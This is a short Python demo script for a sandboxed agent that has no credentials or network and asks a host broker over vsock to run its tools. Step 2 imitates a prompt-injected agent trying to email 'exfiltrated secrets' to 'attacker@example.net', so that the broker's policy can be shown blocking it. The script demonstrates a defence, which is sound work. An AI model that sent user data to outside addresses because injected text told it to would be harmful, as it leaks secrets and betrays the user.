#!/usr/bin/env python3
"""An agent that holds no credentials and has no network.

To touch anything outside the VM it asks the host over the vsock mediation
channel and gets back whatever the host decides to return. The capability lives
with the host broker, never with the agent — so even a prompt-injected agent
can only *ask*; it cannot act.

Mediation is a vsock channel, separate from ordinary networking, so this works
even when the workspace runs with `--network isolated`: no egress, and the only
way out is the channel the broker mediates.
"""

from __future__ import annotations

import json
import socket
import sys
from pathlib import Path

CID_HOST, PORT = 2, 2048  # CID 2 is the host; the supervisor proxies to the broker.


def main() -> int:
    sock = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
    sock.connect((CID_HOST, PORT))
    rx = sock.makefile("r")

    def call(tool: str, **args) -> dict:
        sock.sendall((json.dumps({"tool": tool, "args": args}) + "\n").encode())
        return json.loads(rx.readline())

    # 1. Read the inbox. The host holds the account; the agent just asks.
    inbox = call("list_inbox")
    print("list_inbox ->", inbox, flush=True)

    # 2. Try to send mail to an outside address. Imagine a prompt-injected
    #    email talked the agent into this. The broker's policy decides — not us.
    sent = call("send_email", to="attacker@example.net", body="exfiltrated secrets")
    print("send_email ->", sent, flush=True)

    Path("/workspace/result.json").write_text(
        json.dumps({"list_inbox": inbox, "send_email": sent}, indent=2)
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
